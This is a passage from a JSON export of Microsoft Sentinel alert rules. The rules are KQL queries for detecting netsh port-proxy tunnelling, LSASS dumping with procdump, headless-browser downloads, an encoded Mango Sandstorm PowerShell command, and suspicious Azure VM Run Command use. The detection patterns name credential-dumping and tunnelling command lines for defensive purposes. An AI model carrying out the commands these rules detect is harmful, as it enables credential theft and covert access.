AD\nMITRE:TA0003;T1078;T1078.001;T1078.002;T1078.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:34:18.1397695Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6d7521ff-1f2a-4387-bc4a-5ea0f6cc2b9f","name":"6d7521ff-1f2a-4387-bc4a-5ea0f6cc2b9f","etag":"\"87001bc1-0000-2700-0000-66fdc8490000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Rob Russell\r\n// Description: Detects the use of netsh to create a proxy\r\n// https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/\r\n// https://www.mandiant.com/resources/blog/bypassing-network-restrictions-through-rdp-tunneling\r\n// https://www.dfirnotes.net/portproxy_detection/\r\n// False Positives: no known false positives\r\nlet signInLookup = (\r\nSigninLogs \r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName\r\n);\r\n(union isfuzzy=True\r\n    (\r\n    DeviceProcessEvents \r\n    | where (\r\n            (InitiatingProcessFolderPath endswith @\"\\netsh.exe\") and \r\n    (\r\n    (InitiatingProcessCommandLine has_all (\"interface\",\"portproxy\", \"add\", \"v4tov4\")) or \r\n    (InitiatingProcessCommandLine has_all (\"i \", \"p \", \"a \", \"v \")) or \r\n    (InitiatingProcessCommandLine has_all (\"connectp\", \"listena\", \"c=\"))\r\n    )\r\n    )\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessAccountName, ActionType, InitiatingProcessCommandLine, Tactic = \"proxy detected via netsh\"\r\n    ),(\r\n    DeviceRegistryEvents \r\n    | where (RegistryKey == @\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\")\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessAccountName, ActionType, RegistryKey, Tactic = \"proxy detected via registry\"\r\n    )\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"customDetails":{"Details":"Tactic"},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"}]},{"entityType":"RegistryKey","fieldMappings":[{"identifier":"Key","columnName":"RegistryKey"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"InitiatingProcessCommandLine"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation","DefenseEvasion","Discovery","CommandAndControl"],"techniques":["T1546","T1562","T1518","T1090"],"displayName":"BAH_NetshProxy","enabled":true,"description":"Detects the use of netsh to create a proxy                                                                                                                                                                                                                                              \n https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/\n https://www.mandiant.com/resources/blog/bypassing-network-restrictions-through-rdp-tunneling\n https://www.dfirnotes.net/portproxy_detection/\nPLATFORM:Windows\nMITRE:TA0011;T1090","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:25:09.9485335Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/945098cb-29bd-476b-bdaf-e8c449085b0c","name":"945098cb-29bd-476b-bdaf-e8c449085b0c","etag":"\"8700d192-0000-2700-0000-66fdc5360000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Author: Ginna Woo\r\n//Description: Detects uncommon actions performed and uncommon high volume of actions performed by administrators. \r\n//False Positive(s): None known \r\nlet getAdminRoleUsers = (adminroles:dynamic) {\r\nIdentityInfo\r\n| where AssignedRoles has_any (adminroles)\r\n| extend UserPrincipalName=AccountUPN\r\n| distinct UserPrincipalName, tostring(AssignedRoles)\r\n};\r\nBehaviorAnalytics\r\n| where TimeGenerated >= ago(30d)\r\n| where InvestigationPriority >= 0\r\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\r\n| extend ActionUncommonlyPerformedByUser = column_ifexists(\"ActionUncommonlyPerformedByUser\", \"\")\r\n| extend UncommonHighVolumeOfActions = column_ifexists(\"UncommonHighVolumeOfActions\", \"\")\r\n| where ActionUncommonlyPerformedByUser == 'True' or UncommonHighVolumeOfActions == 'True'\r\n| join kind=inner (\r\n        OfficeActivity\r\n        | where TimeGenerated >= ago(1d)\r\n        | extend UserPrincipalName = UserId\r\n        | project-away UserId, Site_, Start_Time, Type, UserKey, UserType, OfficeObjectId, UserAgent, OrganizationId, SourceSystem, SourceRecordId, Site_Url, ClientIP, OfficeWorkload, EventSource, OfficeTenantId, OfficeId) on UserPrincipalName, TimeGenerated\r\n| join kind=inner getAdminRoleUsers(dynamic([\"Global Administrator\", \"Compliance Administrator\"])) on UserPrincipalName, $left.UserPrincipalName == $right.UserPrincipalName\r\n| project-away UsersInsights, UserPrincipalName1, UserPrincipalName2, TimeGenerated1, TimeGenerated, TimeProcessed, TenantId1, EventSource, Type, OrganizationId_, SourceFileName_, SourceRelativeUrl_, UserId_, SourceRecordId\r\n| project-rename TimeGenerated=ElevationTime","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"TargetUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":[],"displayName":"BAH_UEBA_1-UncommonActivities","enabled":true,"description":"Detects uncommon actions performed and uncommon high volume of actions performed by administrators. \nPLATFORM:Microsoft 365\nMITRE:TA0004;T1548;T1548.005","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:11:55.2084456Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f034e2e5-5fb0-465c-a9db-287dccb77945","name":"f034e2e5-5fb0-465c-a9db-287dccb77945","etag":"\"8800f120-0000-2700-0000-66fdcedf0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let UA_threats = dynamic([\"FoxBlade\", \"WhisperGate\", \"Lasainraw\", \"SonicVote\", \"CaddyWiper\", \"AprilAxe\", \"FiberLake\", \"Industroyer\", \"DesertBlade\"]);\nSecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatFamilyName in~ (UA_threats)\n| extend HostName = tostring(split(CompromisedEntity, \".\")[0]), DomainIndex = toint(indexof(CompromisedEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(CompromisedEntity, DomainIndex + 1), CompromisedEntity)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]}],"templateVersion":"1.1.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485"],"displayName":"AV detections related to Ukraine threats","enabled":true,"description":"This query looks for Microsoft Defender AV detections for malware observed in relation to the war in Ukraine.\n  Ref: https://msrc-blog.microsoft.com/2022/02/28/analysis-resources-cyber-threat-activity-ukraine/ \nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078,TA0003;T1078,TA0004;T1078,TA0005;T1078;T1562;T1562.001;T1562.007;T1562.008,TA0006;T1110;T1110.001;T1110.003;T1110.004,TA0007;T1082;T1518;T1518.001,TA0040;T1485;T1489;T1489.001;T1489.002;T1490;T1499;T1499.002;T1499.003;T1499.004","alertRuleTemplateName":"b6685757-3ed1-4b05-a5bd-2cacadc86c2a","lastModifiedUtc":"2024-10-02T22:53:16.3653293Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e2411ebb-2f73-4161-bca7-717e5f6ba8bb","name":"e2411ebb-2f73-4161-bca7-717e5f6ba8bb","etag":"\"e0036eb9-0000-2700-0000-64871df90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join (SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| where ThreatName has \"Solorigate\"\n| extend HostCustomEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.HostCustomEntity\n| project TimeGenerated, DisplayName, ThreatName, CompromisedEntity, PublicIP, MachineGroup, AlertSeverity, Description, LoggedOnUsers, DeviceId, TenantId, HostCustomEntity\n| extend timestamp = TimeGenerated, IPCustomEntity = PublicIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1195"],"displayName":"Solorigate Defender Detections","enabled":true,"description":"Surfaces any Defender Alert for Solorigate Events. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as\n Device group, ip, logged on users etc. This way, the Microsoft Sentinel user can have all the pertinent device info in one view for all the the Solarigate Defender alerts.","alertRuleTemplateName":"e70fa6e0-796a-4e85-9420-98b17b0bb749","lastModifiedUtc":"2023-06-12T13:30:32.2725861Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/313c540f-eb15-4cea-9eaf-4df9266c2572","name":"313c540f-eb15-4cea-9eaf-4df9266c2572","etag":"\"870002ce-0000-2700-0000-66fdc9370000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_LsassDumpViaProcDump\r\n//Description: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the LSass.exe process. This also is able to detect on instances where an attacker has renamed the procdump executable.\r\n//Author: Steven Wan\r\n//False Positives: None applicable at this time.\r\n\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\nDeviceProcessEvents \r\n| where ((InitiatingProcessCommandLine contains \" -ma \" or InitiatingProcessCommandLine contains \"/ma \") and InitiatingProcessCommandLine contains \" ls\")\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI // this join will add UserPrincipalName from here forward based on device name\r\n| project TimeGenerated, UserPrincipalName, AccountName, DeviceId, DeviceName, ActionType, FileName, InitiatingProcessCommandLine, ProcessCommandLine","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","DefenseEvasion"],"techniques":["T1003","T0849"],"displayName":"BAH_LsassDumpViaProcDump","enabled":true,"description":"Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the LSass.exe process. This also is able to detect on instances where an attacker has renamed the procdump executable.\nPLATFORM:Windows\nMITRE:TA0006;T1003,TA0103;T0849","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:29:10.9152832Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d102446f-36c6-498a-990c-16c27867a47a","name":"d102446f-36c6-498a-990c-16c27867a47a","etag":"\"8700b2dc-0000-2700-0000-66fdca530000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_HeadlessBrowserFileDownloads\r\n//Description: Detects execution of chromium-based browsers such as Edge or Chrome in headless mode using the \"dump-dom\" command line to download files. This threat was detected in March 2023 through Ducktail which threat actors used information-stealing malware to target Facebook business accounts and spear-phishing campaigns through LinkedIn direct messages.\r\n//Author: Steven Wan\r\n//False Positives: None applicable at this time.\r\n\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\nDeviceProcessEvents \r\n| where ((InitiatingProcessFolderPath endswith @\"\\brave.exe\" or InitiatingProcessFolderPath endswith @\"\\chrome.exe\" or InitiatingProcessFolderPath endswith @\"\\msedge.exe\" or InitiatingProcessFolderPath endswith @\"\\opera.exe\" or InitiatingProcessFolderPath endswith @\"\\vivaldi.exe\") and InitiatingProcessCommandLine contains \"--headless\" and InitiatingProcessCommandLine contains \"dump-dom\" and InitiatingProcessCommandLine contains \"http\")\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI // this join will add UserPrincipalName from here forward based on device name\r\n| project TimeGenerated,AccountName,DeviceName,FileName,InitiatingProcessCommandLine,InitiatingProcessFolderPath,InitiatingProcessSHA1","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl"],"techniques":["T1105"],"displayName":"BAH_HeadlessBrowserFileDownloads","enabled":true,"description":"Detects execution of chromium-based browsers such as Edge or Chrome in headless mode using the \"dump-dom\" command line to download files. This threat was detected in March 2023 through Ducktail which threat actors used information-stealing malware to target Facebook business accounts and spear-phishing campaigns through LinkedIn direct messages.\nPLATFORM:Windows\nMITRE:TA0011;T1105","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:33:55.0402645Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f6ead888-2f01-48af-a810-3b3d629d2fc0","name":"f6ead888-2f01-48af-a810-3b3d629d2fc0","etag":"\"87002441-0000-2700-0000-66fdc0020000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceProcessEvents\n| where FileName =~ \"powershell.exe\" and ProcessCommandLine has_cs \"-exec bypass -w 1 -enc\"  \n| where ProcessCommandLine contains_cs \"UwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAKABzAGEAcABzACAAKAAiAHAA\" \n| extend timestamp = TimeGenerated, AccountCustomEntity = AccountName, HostCustomEntity = DeviceName, ProcessCustomEntity = InitiatingProcessFileName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"ProcessCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","DefenseEvasion","PrivilegeEscalation","CredentialAccess","Discovery","LateralMovement","CommandAndControl"],"techniques":["T1059","T1027","T1562","T1068","T1552","T1083","T1087","T1021","T1071","T1568","T1573"],"displayName":"Identify Mango Sandstorm powershell commands","enabled":true,"description":"The query below identifies powershell commands used by the threat actor Mango Sandstorm.\nReference:  https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\n\nExecution, Defense Evasion, Privilege Escalation, Credential Access, Discovery, Lateral Movement, Command and Control,\n\nT1059- Command and Scripting Interpreter: T1059.001, T1027: Obfuscated Files or Information, T1562- Impair Defenses: T1562.001, T1068: Exploitation for Privilege Escalation, T1552- Unsecured Credentials: T1552.004, T1083- File and Directory Discovery, T1087: Account Discovery, T1021- Remote Services: T1021.006, T1071- Application Layer Protocol: T1071.001, T1568: Dynamic Resolution, T1573- Encrypted Channel:T1573.002\n\nPLATFORM:IaaS,Azure AD,Microsoft 365\nMITRE:TA0002;T1059;T1059.009","alertRuleTemplateName":"ce74dc9a-cb3c-4081-8c2f-7d39f6b7bae1","lastModifiedUtc":"2024-10-02T21:49:53.8840619Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/40e17a73-6e85-49c2-b8db-c2263528fa88","name":"40e17a73-6e85-49c2-b8db-c2263528fa88","etag":"\"88002611-0000-2700-0000-66fdcdc20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AzureActivity\n// Isolate run command actions\n| where OperationNameValue =~ \"MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION\"\n// Confirm that the operation impacted a virtual machine\n| where Authorization has \"virtualMachines\"\n// Each runcommand operation consists of three events when successful, Started, Accepted (or Rejected), Successful (or Failed).\n| summarize StartTime=min(TimeGenerated), EndTime=max(TimeGenerated), max(CallerIpAddress), make_list(ActivityStatusValue) by CorrelationId, Authorization, Caller\n// Limit to Run Command executions that Succeeded\n| where list_ActivityStatusValue has_any (\"Success\", \"Succeeded\")\n// Extract data from the Authorization field\n| extend Authorization_d = parse_json(Authorization)\n| extend Scope = Authorization_d.scope\n| extend Scope_s = split(Scope, \"/\")\n| extend Subscription = tostring(Scope_s[2])\n| extend VirtualMachineName = tostring(Scope_s[-1])\n| project StartTime, EndTime, Subscription, VirtualMachineName, CorrelationId, Caller, CallerIpAddress=max_CallerIpAddress\n// Create a join key using  the Caller (UPN)\n| extend joinkey = tolower(Caller)\n// Join the Run Command actions to UEBA data\n| join kind = inner (\n    BehaviorAnalytics\n    // We are specifically interested in unusual logins\n    | where EventSource == \"Azure AD\" and ActivityInsights.ActionUncommonlyPerformedByUser == \"True\"\n    | project UEBAEventTime=TimeGenerated, UEBAActionType=ActionType, UserPrincipalName, UEBASourceIPLocation=SourceIPLocation, UEBAActivityInsights=ActivityInsights, UEBAUsersInsights=UsersInsights\n    | where isnotempty(UserPrincipalName) and isnotempty(UEBASourceIPLocation)\n    | extend joinkey = tolower(UserPrincipalName)\n) on joinkey\n// Create a window around the UEBA event times, check to see if the Run Command action was performed within them\n| extend UEBAWindowStart = UEBAEventTime - 1h, UEBAWindowEnd = UEBAEventTime + 6h\n| where StartTime between (UEBAWindowStart .. UEBAWindowEnd)\n| project StartTime, EndTime, Subscription, VirtualMachineName, Caller, CallerIpAddress, UEBAEventTime, UEBAActionType, UEBASourceIPLocation, UEBAActivityInsights, UEBAUsersInsights\n| extend timestamp = StartTime, AccountCustomEntity=Caller, IPCustomEntity=CallerIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"templateVersion":"1.0.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Execution","Persistence","PrivilegeEscalation","DefenseEvasion","CredentialAccess","Discovery","Impact"],"techniques":["T1078","T1059","T1543","T1207","T1003","T1012","T1486","T1490"],"displayName":"Azure VM Run Command operation executed during suspicious login window","enabled":true,"description":"Identifies when the Azure Run Command operation is executed by a UserPrincipalName and IP Address that has resulted in a recent user entity behavior alert.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1078;T1078.004,TA0004;T1078;T1078.004,TA0005;T1078;T1078.004","alertRuleTemplateName":"11bda520-a965-4654-9a45-d09f372f71aa","lastModifiedUtc":"2024-10-02T22:48:29.9188058Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/67a89a5d-17cb-4400-ab1b-23536d3d1f25","name":"67a89a5d-17cb-4400-ab1b-23536d3d1f25","etag":"\"e100c496-0000-2700-0000-65deed8f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let RunCommandData = materialize ( AzureActivity\n// Isolate run command actions\n| where OperationNameValue =~ \"Microsoft.Compute/virtualMachines/runCommand/action\"\n// Confirm that the operation impacted a virtual machine\n| where Authorization has \"virtualMachines\"\n// Each runcommand operation consists of three events when successful, StartTimeed, Accepted (or Rejected), Successful (or Failed).\n| summarize StartTime=min(TimeGenerated), EndTime=max(TimeGenerated), max(CallerIpAddress), make_list(ActivityStatusValue) by CorrelationId, Authorization, Caller\n// Limit to Run Command executions that Succeeded\n| where list_ActivityStatusValue has_any (\"Succeeded\", \"Success\")\n// Extract data from the Authorization field, allowing us to later extract the Caller (UPN) and CallerIpAddress\n| extend Authorization_d = parse_json(Authorization)\n| extend Scope = Authorization_d.scope\n| extend Scope_s = split(Scope, \"/\")\n| extend Subscription = tostring(Scope_s[2])\n| extend VirtualMachineName = tostring(Scope_s[-1])\n| project StartTime, EndTime, Subscription, VirtualMachineName, CorrelationId, Caller, CallerIpAddress=max_CallerIpAddress\n| join kind=leftouter (\n    DeviceFileEvents\n    | where InitiatingProcessFileName == \"RunCommandExtension.exe\"\n    | extend VirtualMachineName = tostring(split(DeviceName, \".\")[0])\n    | project VirtualMachineName, PowershellFileCreatedTimestamp=TimeGenerated, FileName, FileSize, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFolderPath, InitiatingProcessId\n) on VirtualMachineName\n// We need to filter by time sadly, this is the only way to link events\n| where PowershellFileCreatedTimestamp between (StartTime .. EndTime)\n| project StartTime, EndTime, PowershellFileCreatedTimestamp, VirtualMachineName, Caller, CallerIpAddress, FileName, FileSize, InitiatingProcessId, InitiatingProcessAccountDomain, InitiatingProcessFolderPath\n| join kind=inner(\n    DeviceEvents\n    | extend VirtualMachineName = tostring(split(DeviceName, \".\")[0])\n    | where InitiatingProcessCommandLine has \"-File\"\n    // Extract the script name based on the structure used by the RunCommand extension\n    | extend PowershellFileName = extract(@\"\\-File\\s(script[0-9]{1,9}\\.ps1)\", 1, InitiatingProcessCommandLine)\n    // Discard results that didn't successfully extract, these are not run command related\n    | where isnotempty(PowershellFileName)\n    | extend PSCommand = tostring(parse_json(AdditionalFields).Command)\n    // The first execution of PowerShell will be the RunCommand script itself, we can discard this as it will break our hash later\n    | where PSCommand != PowershellFileName \n    // Now we normalise the cmdlets, we're aiming to hash them to find scripts using rare combinations\n    | extend PSCommand = toupper(PSCommand)\n    | order by PSCommand asc\n    | summarize PowershellExecStartTime=min(TimeGenerated), PowershellExecEnd=max(TimeGenerated), make_list(PSCommand) by PowershellFileName, InitiatingProcessCommandLine\n) on $left.FileName == $right.PowershellFileName\n| project StartTime, EndTime, PowershellFileCreatedTimestamp, PowershellExecStartTime, PowershellExecEnd, PowershellFileName, PowershellScriptCommands=list_PSCommand, Caller, CallerIpAddress, InitiatingProcessCommandLine, PowershellFileSize=FileSize, VirtualMachineName\n| order by StartTime asc \n// We generate the hash based on the cmdlets called and the size of the powershell script\n| extend TempFingerprintString = strcat(PowershellScriptCommands, PowershellFileSize)\n| extend ScriptFingerprintHash = hash_sha256(tostring(PowershellScriptCommands)));\nlet totals = toscalar (RunCommandData\n| summarize count());\nlet hashTotals = RunCommandData\n| summarize HashCount=count() by ScriptFingerprintHash;\nRunCommandData\n| join kind=leftouter (\nhashTotals\n) on ScriptFingerprintHash\n// Calculate prevalence, while we don't need this, it may be useful for responders to know how rare this script is in relation to normal activity\n| extend Prevalence = toreal(HashCount) / toreal(totals) * 100\n// Where the hash was only ever seen once.\n| where HashCount == 1\n| extend timestamp = StartTime, IPCustomEntity=CallerIpAddress, AccountCustomEntity=Caller, HostCustomEntity=VirtualMachineName\n| project timestamp, StartTime, EndTime, PowershellFileName, VirtualMachineName, Caller, CallerIpAddress, PowershellScriptCommands, PowershellFileSize, ScriptFingerprintHash, Prevalence, IPCustomEntity, AccountCustomEntity, HostCustomEntity","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["LateralMovement","Execution"],"techniques":["T1570","T1059"],"displayName":"Azure VM Run Command operations 